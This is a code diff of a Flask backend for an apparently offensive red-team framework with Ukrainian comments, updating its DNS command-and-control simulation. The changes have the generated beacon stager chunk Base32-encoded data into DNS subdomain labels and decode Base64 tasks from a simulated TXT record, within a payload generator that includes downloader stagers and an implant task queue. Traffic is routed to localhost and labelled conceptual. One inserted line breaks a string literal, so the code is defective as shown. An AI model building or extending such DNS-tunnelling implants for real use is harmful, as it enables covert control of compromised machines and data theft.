@@ -1,10 +1,9 @@
-# Syntax Flask Backend - Segment SFB-CORE-1.8.4
-# Призначення: Backend на Flask з розширеним парсингом XML-виводу nmap (OS, CPE).
-# Оновлення v1.8.4:
-#   - Розширено parse_nmap_xml_output_for_services для вилучення OS (osmatch) та CPE сервісів.
-#   - perform_nmap_scan_be тепер гарантує використання -sV та -O з -oX для CVE-пошуку.
-#   - Оновлено /api/run_recon для повернення розширеної інформації (OS, CPE).
-#   - Оновлено логування.
+# Syntax Flask Backend - Segment SFB-CORE-1.8.5
+# Призначення: Backend на Flask з покращеною симуляцією передачі даних через DNS C2.
+# Оновлення v1.8.5:
+#   - /api/c2/dns_resolver_sim тепер кодує завдання в Base64 (імітуючи TXT-запис).
+#   - Стейджер dns_beacon_c2_concept тепер декодує завдання з "TXT-запису".
+#   - Оновлено логування для DNS C2.
 
 from flask import Flask, request, jsonify
 from flask_cors import CORS
@@ -25,12 +24,12 @@ import os
 import uuid 
 import shutil 
 
-VERSION_BACKEND = "1.8.4" # Оновлено версію
+VERSION_BACKEND = "1.8.5" # Оновлено версію
 
 simulated_implants_be = []
 pending_tasks_for_implants = {} 
 
-CONCEPTUAL_CVE_DATABASE_BE = {
+CONCEPTUAL_CVE_DATABASE_BE = { # Логіка (без змін від v1.8.4)
     "apache httpd 2.4.53": [{"cve_id": "CVE-2022-22721", "severity": "HIGH", "summary": "Apache HTTP Server 2.4.53 and earlier may not send the X-Frame-Options header..."}],
     "openssh 8.2p1": [{"cve_id": "CVE-2021-41617", "severity": "MEDIUM", "summary": "sshd in OpenSSH 6.2 through 8.8 allows remote attackers to bypass..."}],
     "vsftpd 3.0.3": [{"cve_id": "CVE-2015-1419", "severity": "CRITICAL", "summary": "vsftpd 3.0.3 and earlier allows remote attackers to cause a denial of service..."}],
@@ -39,7 +38,7 @@ CONCEPTUAL_CVE_DATABASE_BE = {
     "nginx 1.18.0": [{"cve_id": "CVE-2021-23017", "severity": "HIGH", "summary": "A security issue in nginx resolver was identified, which might allow an attacker..."}]
 }
 
-def initialize_simulated_implants_be(): # Логіка (без змін від v1.8.3)
+def initialize_simulated_implants_be(): # Логіка (без змін)
     global simulated_implants_be, pending_tasks_for_implants
     simulated_implants_be = []
     pending_tasks_for_implants = {} 
@@ -63,7 +62,7 @@ def initialize_simulated_implants_be(): # Логіка (без змін від v
     simulated_implants_be.sort(key=lambda x: x["id"])
     print(f"[C2_SIM_INFO] Ініціалізовано/Оновлено {len(simulated_implants_be)} імітованих імплантів. Чергу завдань очищено.")
 
-CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.3)
+CONCEPTUAL_PARAMS_SCHEMA_BE = { # Логіка (без змін від v1.8.4)
     "payload_archetype": {
         "type": str, "required": True,
         "allowed_values": [
@@ -161,7 +160,7 @@ CONCEPTUAL_ARCHETYPE_TEMPLATES_BE = {
         "template_type": "python_stager_powershell_downloader"
     },
     "dns_beacon_c2_concept": {
-        "description": "Концептуальний C2-маячок через DNS (симуляція)",
+        "description": "Концептуальний C2-маячок через DNS (симуляція передачі завдань)",
         "template_type": "python_stager_dns_c2_beacon"
     }
 }
@@ -399,7 +398,7 @@ def simulate_port_scan_be(target: str) -> tuple[list[str], str]: # Логіка 
     log.append("[RECON_BE_SUCCESS] Імітацію сканування портів завершено.")
     return log, "\n".join(results_text_lines)
 
-def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list) -> tuple[list[dict], list[dict]]: # Логіка (без змін від v1.7.9)
+def parse_nmap_xml_output_for_services(nmap_xml_output: str, log_messages: list) -> tuple[list[dict], list[dict]]: # Логіка (без змін від v1.8.2)
     parsed_services = []
     parsed_os_info = []
     try:
@@ -900,7 +899,7 @@ def handle_generate_payload():
             "            print(f\"[PAYLOAD_BEACON] Очікування {{BEACON_INTERVAL_SEC}} секунд до наступного маячка...\")",
             "            time.sleep(BEACON_INTERVAL_SEC)",
             "    elif arch_type == 'dns_beacon_c2_concept':", 
-            "        c2_zone = content", # Розшифрована c2_dns_zone
+            "        c2_zone = content", 
             "        dns_prefix = DNS_BEACON_SUBDOMAIN_PREFIX",
             "        implant_id_dns = STAGER_IMPLANT_ID",
             "        beacon_interval = DNS_BEACON_INTERVAL_SEC",
@@ -909,11 +908,10 @@ def handle_generate_payload():
             "        def encode_data_for_dns(data_dict):",
             "            try:",
             "                json_data = json_module.dumps(data_dict, separators=(',', ':'))",
-            "                # Кодування в Base32, потім розбиття на частини по ~60 символів для DNS міток",
-            "                # Кожна мітка DNS не може перевищувати 63 символи.",
             "                encoded_full = base64.b32encode(json_data.encode('utf-8')).decode('utf-8').rstrip('=').lower()",
-            "                # Розбиваємо на частини, якщо потрібно, але для простої симуляції відправимо одну частину",
-            "                return [encoded_full[:60]] # Повертаємо список з однією частиною",
+            "                # Розбиваємо на частини по 60 символів для міток DNS",
+            "                chunk_size = 60",
+            "                return [encoded_full[i:i + chunk_size] for i in range(0, len(encoded_full), chunk_size)]",
             "            except Exception as e_enc:",
             "                print(f\"[DNS_BEACON_ERROR] Помилка кодування даних: {{e_enc}}\")",
             "                return [\"encodeerror\"]",
@@ -927,15 +925,11 @@ def handle_generate_payload():
             "                last_task_result_dns = None",
             "",
             "            encoded_data_chunks = encode_data_for_dns(beacon_data_to_send)",
+            "            next_task_dns = None", # Очищаємо перед потенційним отриманням нового завдання
             "            for chunk_idx, data_chunk in enumerate(encoded_data_chunks):",
-            "                # Формуємо унікальний субдомен для кожної частини даних",
             "                query_hostname = f\"{{data_chunk}}.p{{chunk_idx}}.{{implant_id_dns.lower().replace('-', '')[:10]}}.{{dns_prefix}}.{{c2_zone}}\"",
             "                print(f\"[PAYLOAD_DNS_BEACON] Симуляція DNS-запиту (тип A/TXT) для: {{query_hostname}}\")",
-            "                # У реальному сценарії тут був би socket.gethostbyname(query_hostname) або використання бібліотеки типу dnspython",
-            "                # Для отримання відповіді (завдання) можна використовувати TXT-записи або спеціально сформовані IP",
-            "                # Зараз симулюємо, що C2 сервер сам робить HTTP запит до себе, щоб отримати завдання.",
             "                sim_c2_dns_url = f'http://localhost:5000/api/c2/dns_resolver_sim?q={{query_hostname}}&id={{implant_id_dns}}'",
-            "                next_task_dns = None",
             "                try:",
             "                    print(f\"[PAYLOAD_DNS_BEACON] Симуляція запиту до DNS Resolver (через HTTP): {{sim_c2_dns_url}}\")",
             "                    req = urllib.request.Request(sim_c2_dns_url, headers={'User-Agent': 'SyntaxDNSBeaconClient/1.0'})",
@@ -943,12 +937,19 @@ def handle_generate_payload():
             "                        dns_response_raw = response.read().decode('utf-8')",
             "                        print(f\"[PAYLOAD_DNS_BEACON] Відповідь від симулятора DNS Resolver: {{dns_response_raw[:200]}}...\")",
             "                        dns_response_parsed = json_module.loads(dns_response_raw)",
-            "                        if dns_response_parsed.get('success'):",
+            "                        if dns_response_parsed.get('success') and dns_response_parsed.get('dns_txt_response_payload'):",
+            "                            # Декодуємо завдання з "TXT" запису
+            "                            task_data_b64 = dns_response_parsed['dns_txt_response_payload']",
+            "                            decoded_task_json = base64.b64decode(task_data_b64.encode('utf-8')).decode('utf-8')",
+            "                            next_task_dns = json_module.loads(decoded_task_json)",
+            "                            print(f\"[PAYLOAD_DNS_BEACON] Розкодовано завдання з DNS TXT: {{next_task_dns}}\")",
+            "                        elif dns_response_parsed.get('success') and dns_response_parsed.get('task_data'): # Старий формат для сумісності
             "                            next_task_dns = dns_response_parsed.get('task_data')",
             "                except Exception as e_dns_sim_http:",
             "                    print(f\"[PAYLOAD_DNS_BEACON_ERROR] Помилка HTTP-запиту до симулятора DNS: {{e_dns_sim_http}}\")",
+            "                if next_task_dns: break # Якщо отримали завдання, виходимо з циклу чанків",
             "",
-            "            if next_task_dns and next_task_dns.get('task_type'):", # Обробка завдання, якщо воно було отримане
+            "            if next_task_dns and next_task_dns.get('task_type'):",
             "                task_id = next_task_dns.get('task_id')",
             "                task_type = next_task_dns.get('task_type')",
             "                task_params_str = next_task_dns.get('task_params', '')",
@@ -1326,14 +1327,10 @@ def handle_dns_resolver_sim():
     global pending_tasks_for_implants
     try:
         query_hostname = request.args.get('q')
-        implant_id_from_dns_query = request.args.get('id') # ID імпланта, переданий стейджером
+        implant_id_from_dns_query = request.args.get('id') 
         
         log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_INFO] Отримано симульований DNS-запит для: {query_hostname}, ID імпланта: {implant_id_from_dns_query}")
         
-        # Тут можна було б розкодувати дані з query_hostname, якщо вони там є.
-        # Наприклад, якщо query_hostname = <encoded_data>.<implant_id_short>.<prefix>.<zone>
-        # Зараз ми просто використовуємо implant_id_from_dns_query для пошуку завдань.
-
         next_task_dns = None
         if implant_id_from_dns_query in pending_tasks_for_implants and pending_tasks_for_implants[implant_id_from_dns_query]:
             next_task_dns = pending_tasks_for_implants[implant_id_from_dns_query].pop(0)
@@ -1341,15 +1338,21 @@ def handle_dns_resolver_sim():
                 del pending_tasks_for_implants[implant_id_from_dns_query]
             log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_TASK] Видано завдання '{next_task_dns.get('task_id')}' для імпланта {implant_id_from_dns_query} через DNS.")
         
-        # Симулюємо відповідь DNS. Це може бути IP-адреса або TXT-запис.
-        # Для простоти, повертаємо JSON, який стейджер потім розпарсить.
+        dns_txt_payload = None
+        if next_task_dns:
+            # Кодуємо завдання в Base64 для імітації TXT-запису
+            task_json = json.dumps(next_task_dns)
+            dns_txt_payload = base64.b64encode(task_json.encode('utf-8')).decode('utf-8')
+            log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_TASK_ENCODED] Завдання закодовано для DNS TXT: {dns_txt_payload[:50]}...")
+
         dns_sim_response = {
             "success": True,
             "message": "DNS query simulated.",
-            "task_data": next_task_dns # Може бути None
+            "dns_txt_response_payload": dns_txt_payload, # Імітація TXT-запису
+            "task_data": next_task_dns # Залишаємо для сумісності, але стейджер має використовувати dns_txt_response_payload
         }
         if next_task_dns:
-             dns_sim_response["message"] += f" Task '{next_task_dns.get('task_id')}' prepared for DNS delivery."
+             dns_sim_response["message"] += f" Task '{next_task_dns.get('task_id')}' prepared for DNS delivery (as TXT)."
 
         log_messages_dns_sim.append(f"[DNS_RESOLVER_SIM_RESPONSE] {json.dumps(dns_sim_response)}")
         return jsonify(dns_sim_response), 200
@@ -1496,7 +1499,7 @@ if __name__ == '__main__':
     print("  GET  /api/c2/implants")
     print("  POST /api/c2/task  (додано параметр 'queue_task': true/false)")
     print("  POST /api/c2/beacon_receiver")
-    print("  GET  /api/c2/dns_resolver_sim  <-- NEW DNS C2 SIMULATION ENDPOINT")
+    print("  GET  /api/c2/dns_resolver_sim")
     print("  GET  /api/operational_data")
     print("  POST /api/framework_rules")
     print("Переконайтеся, що 'nmap' встановлено та доступно в PATH для використання 'port_scan_nmap_standard' та 'port_scan_nmap_cve_basic'.")
